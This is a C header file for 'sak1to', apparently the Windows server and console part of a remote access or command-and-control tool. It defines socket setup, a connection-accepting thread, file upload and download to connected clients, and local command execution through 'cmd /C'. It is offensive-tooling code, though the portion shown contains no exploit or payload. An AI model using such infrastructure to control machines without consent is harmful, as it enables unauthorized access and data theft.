/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#ifndef SAKITO_SWIN_UTILS_H
#define SAKITO_SWIN_UTILS_H

#include <WS2tcpip.h>
#include <Windows.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>

#define CONSOLE_FSTR "sak1to-console-(%s>"
#define INTERACT_FSTR "%d-(%s)-%s>"
#define INVALID_FILE INVALID_HANDLE_VALUE
#define READ 1
#define WRITE 0

/*
Below containsf API macros that alias/wrap various unix/linux specific functions and linux syscalls.
All functions prefixed with sakito_win_* are located within sakito_core.h.
*/

// Store current working directory in a provided buffer.
#define get_cwd(buf) GetCurrentDirectory(BUFLEN, buf)

// Writing/sending data to a given NT kernel handle (SOCKET).
#define sakito_tcp_send(socket, buf, count) send(socket, buf, count, 0)

// Reading/receiving data from a given NT kernel handle (SOCKET).
#define sakito_tcp_recv(socket, buf, count) recv(socket, buf, count, 0)

// Calculating the size of a file via HANDLE.
#define sakito_file_size(file) sakito_win_fsize(file) 

// Writing/sending a file's bytes to client (upload).
#define sakito_send_file(socket, file, buf, f_size) sakito_win_sendf(socket, file, buf, f_size)

// Reading/receiving a file's bytes from client (download).
#define sakito_recv_file(socket, file, buf, f_size) sakito_win_recvf(socket, file, buf, f_size)

// Closing a given HANDLE.
#define sakito_close_file(file) CloseHandle(file)

typedef HANDLE s_file;

typedef struct {
	// Client hostname.
	char* host;

	// Client socket.
	SOCKET sock;

} Conn;

typedef struct {
	// Mutex object for race condition checks.
	HANDLE ghMutex;

	// Server buffer.
	char buf[BUFLEN + 9]; // BUFLEN + space for 'command code' + "cmd /C " + '\0'

	// Thread handle for handling execution/termination of accept_conns thread.
	HANDLE acp_thread;

	// Server socket for accepting connections.
	SOCKET listen_socket;

	// Array of Conn objects/structures.
	Conn* clients;

	// Memory blocks allocated.
	size_t clients_alloc;

	// Amount of memory used.
	size_t clients_sz;

} Server_map;

void bind_socket(const SOCKET listen_socket);
void sakito_accept_conns(Server_map* const s_map);
void resize_conns(Server_map* const s_map, int client_id);


// Function to gracefully terminate server.
void terminate_server(const SOCKET socket, const char* const error) 
{
	int err_code = EXIT_SUCCESS;
	if (error) 
	{
		fprintf(stderr, "%s: %ld\n", error, WSAGetLastError());
		err_code = 1;
	}

	closesocket(socket);
	WSACleanup();
	exit(err_code);
}


// WriteFile() WINAPI wrapper for writing data to stdout.
int write_stdout(const char* buf, size_t count) 
{
	HANDLE std_out = GetStdHandle(STD_OUTPUT_HANDLE);
	if (!WriteFile(std_out, buf, count, NULL, NULL))
		return FAILURE;

	return SUCCESS;
}

// Create a socket object.
const SOCKET create_socket() 
{
	// Initialize winsock.
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &wsData);

	// Create the server socket object.
	const SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == INVALID_SOCKET) 
	{
		fprintf(stderr, "Socket creation failed: %ld\n", WSAGetLastError());
		WSACleanup();
		exit(1);
	}

	int optval = 1;
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) != 0)
		terminate_server(listen_socket, "Error setting socket options");

	return listen_socket;
}

// Mutex lock functionality.
void mutex_lock(Server_map* const s_map) 
{
	// If mutex is currently locked wait until it is unlocked.
	WaitForSingleObject(s_map->ghMutex, INFINITE);
}

// Mutex unlock functionality.
void mutex_unlock(Server_map* const s_map) 
{
	// Unlock mutex.
	ReleaseMutex(s_map->ghMutex);
}

// Open/create a file (s_file is a typedef for HANDLE).
s_file sakito_open_file(const char *filename, int rw_flag) 
{
	// Supports only READ/WRITE file modes/operations.
	if (rw_flag == WRITE)
		return sakito_win_openf(filename, GENERIC_WRITE, CREATE_ALWAYS);
	else if (rw_flag == READ)
		return sakito_win_openf(filename, GENERIC_READ, OPEN_EXISTING);
	
	return INVALID_FILE;
}

// Execute a command via the host machine.
void exec_cmd(Server_map* const s_map) 
{
	char cmd_buf[8+BUFLEN] = "cmd /C ";
	strcat(cmd_buf, s_map->buf);
	sakito_win_cp(NULL, cmd_buf);
	fputc('\n', stdout);
}

// Terminate the console application and server.
void terminate_console(Server_map* const s_map) 
{
	// Quit accepting connections.
	TerminateThread(s_map->acp_thread, 0);

	// if there's any connections close them before exiting.
	if (s_map->clients_sz) 
	{
		for (size_t i = 0; i < s_map->clients_sz; i++)
			closesocket(s_map->clients[i].sock);

		// Free allocated memory.
		free(s_map->clients);
	}

	// Stop accepting connections.
	terminate_server(s_map->listen_socket, NULL);
}

void sakito_read_stdin(char* const buf, size_t *cmd_len) 
{
	char ch;
	while((*cmd_len < BUFLEN) && (ReadFile(std_in, &ch, 1, NULL, NULL)) && (ch != '\n'))
		buf[(*cmd_len)++] = ch;
}

// Thread to recursively accept connections.
DWORD WINAPI accept_conns(LPVOID* lp_param) 
{
	// Call sakito wrapper function to accept incoming connections.
	Server_map* const s_map = (Server_map*)lp_param;

	// Create our socket object.
	s_map->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(s_map->listen_socket);

	// Call wrapper function to accept incoming connections.
	sakito_accept_conns(s_map);

	return FAILURE;
}

// Initialization API of the console application and server.
void sakito_init(Server_map* const s_map) 
{
	// Mutex lock for preventing race conditions.
	s_map->ghMutex = CreateMutex(NULL, FALSE, NULL);

	// Begin accepting connections.
	s_map->acp_thread = CreateThread(0, 0, accept_conns, s_map, 0, 0);
}

#endif
